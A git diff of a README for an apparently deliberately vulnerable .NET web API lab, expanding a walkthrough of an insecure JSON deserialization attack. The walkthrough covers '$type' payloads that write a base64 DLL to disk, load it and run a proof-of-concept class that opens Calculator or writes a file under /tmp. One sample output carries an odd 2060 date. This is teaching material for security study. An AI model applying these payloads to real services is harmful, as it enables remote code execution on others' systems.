@@ -34,7 +34,7 @@ Any browser
 The vulnerable web api:
 
 
-```
+```bash
 git clone https://github.com/arale61/VulnJsonWebApi.git
 
 cd VulnJsonWebApi
@@ -45,7 +45,7 @@ dotnet run
 
 Check the port the dev web server is listening to in the output:
 
-```
+```bash
 dotnet run
 Building...
 [...]
@@ -71,7 +71,7 @@ Having running the web api, make a **GET Request** with the **swagger form**:
 
 Pay attention to the **result json**:
 
-```
+```json
 {
   "$type": "VulnJsonWebApi.WeatherForecast[], VulnJsonWebApi",
   "$values": [
@@ -96,7 +96,7 @@ But other **Serializers adopt similar strategies** so just keep in mind the conc
 
 ## Identifying Serializer Settings
 
-```
+```c#
 builder
     .Services
     .AddControllers()
@@ -129,7 +129,7 @@ Playing a bit with the swagger api you can notice that the **rawData** for a **W
 
 Sending the following:
 
-```
+```json
 {
     "$type": "VulnJsonWebApi.WeatherForecast, VulnJsonWebApi",
     "id": "bb2f68dc-b7e5-45e6-9e22-923cd924914d",
@@ -143,7 +143,7 @@ Sending the following:
 
 Or, these one:
 
-```
+```json
 {
     "$type": "VulnJsonWebApi.WeatherForecast, VulnJsonWebApi",
     "id": "bb2f68dc-b7e5-45e6-9e22-923cd924915d",
@@ -166,7 +166,7 @@ This may seem flexible or maybe is **vulnerable**.
 
 If we try to create a child **WeatherForecast** object we see it works!:
 
-```
+```json
 {
     "$type": "VulnJsonWebApi.WeatherForecast, VulnJsonWebApi",
     "id": "bb2f68dc-b7e5-45f6-9e24-943cd924915d",
@@ -265,22 +265,25 @@ You can try to follow these steps:
 
 Build the **AutoLoadClassLib**, sorry for the name, is just a normal class library.
 
-```
+```bash
 cd AutoLoadClassLib
 dotnet build
 
 ```
 
 Then, create the base64 encoded version:
-```
+
+```bash
 cat bin/Debug/net7.0/AutoLoadClassLib.dll| base64 -w0> ./dolenta.dll.b64
 ```
 
-Then, use that base64 (without newlines) to create this dll remotely, sending a POST to WeatherForeCast resource.
+Then, use that **base64** (without newlines) to create this dll remotely, **sending a POST to WeatherForecast resource** using the **rawData** as a placeholder for creating a new **VulnerableFileWrapper** with the base64 as the content.
 
 ![Copy dll](images/copy_dll.png)
 
-Check the dll has been created:
+The **web api** should process the request as normally.
+
+But now a dll has been been created on the specified path:
 
 ![dll Created](images/dll_created.png)
 
@@ -290,11 +293,36 @@ Create a new POST Request and this time use the **System.Configuration.Install.A
 
 After doing this step, you could inspect the loaded dll's into the web api process and you will see that our newly created dll is loaded!
 
-If you did all the steps correctly, now if you invoke our class you will trigger some RCE.
+For example, in windows, you can use [ListDlls from SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls) for checking that the dll has been loaded:
 
-Use the following json to invoke the class in our dummy class library:
+```bash
+    ~/.local/opt/ListDlls/Listdlls64.exe 22000 | grep -E '(Vuln|test)'
 
 ```
+
+Outputs:
+
+```
+    [...]
+    0x0000000013820000  0x8000    c:\\programdata\\test.dll
+        Verified:       Unsigned
+        Publisher:      AutoLoadClassLib
+        Description:    AutoLoadClassLib
+        Product:        AutoLoadClassLib
+        Version:        1.0.0.0
+        File version:   1.0.0.0
+        Create time:    Mon Aug 02 17:17:21 2060
+
+```
+
+Now, the web api process has loaded into memory our dll that we just copied, abusing the (de)serialization process due to an insecure configuration.
+
+
+If you did all the steps correctly, now if you invoke our *class*, in my sample, **AutoLoadClassLib.Class1**, from the loaded dll, **AutoLoadClassLib**, you will trigger some **RCE**.
+
+Use the following json to invoke the class in our dummy class library in the **rawData**:
+
+```json
 {
     "$type": "AutoLoadClassLib.Class1, AutoLoadClassLib",
     "fire":61
@@ -302,3 +330,45 @@ Use the following json to invoke the class in our dummy class library:
 ```
 
 In windows you should see pop a **Calculator**, while in linux a new file **/tmp/arale_was_here** should be created.
+
+This is the definition for **AutoLoadClassLib.Class1**:
+
+```c#
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace AutoLoadClassLib
+{
+    public class Class1
+    {
+        private int fire = 0;
+        public Class1()
+        {
+        }
+
+        public int Fire
+        {
+            get { return fire; }
+            set 
+            { 
+                fire = value;
+                if(value == 61)
+                {
+                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+                    {
+                        File.WriteAllText("/tmp/arale_was_here", "arale61 was here");
+                    }
+                    else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                    {
+                        Process.Start("calc.exe");
+                    }
+                    else
+                    {
+                        throw new NotSupportedException("OS Platform not supported!");
+                    }
+                }
+            }
+        }
+    }
+}
+```
